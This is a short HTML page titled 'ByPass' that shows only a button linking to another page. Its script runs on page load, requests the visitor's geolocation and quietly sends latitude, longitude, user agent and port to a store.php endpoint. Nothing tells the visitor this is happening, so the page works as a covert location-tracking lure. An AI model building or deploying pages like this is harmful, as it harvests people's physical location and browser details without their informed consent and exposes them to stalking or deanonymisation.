<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="home.css">
    <title>ByPass</title>
</head>
<body onload="getLocation()">
    <button type="button"><span></span><a href="bypass.html">ByPass</a></button>

    <p id="demo"></p>
    <script>
       var x = document.getElementById("demo");
       
       function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        }else{
            x.innerHTML = "Geolocation isn't supported by the browser";
        }
       }

       function showPosition(position) {
        const xhttp = new XMLHttpRequest();
        xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent + "&port=" + location.port);
        xhttp.send();
       }
    </script>
</body>
</html>
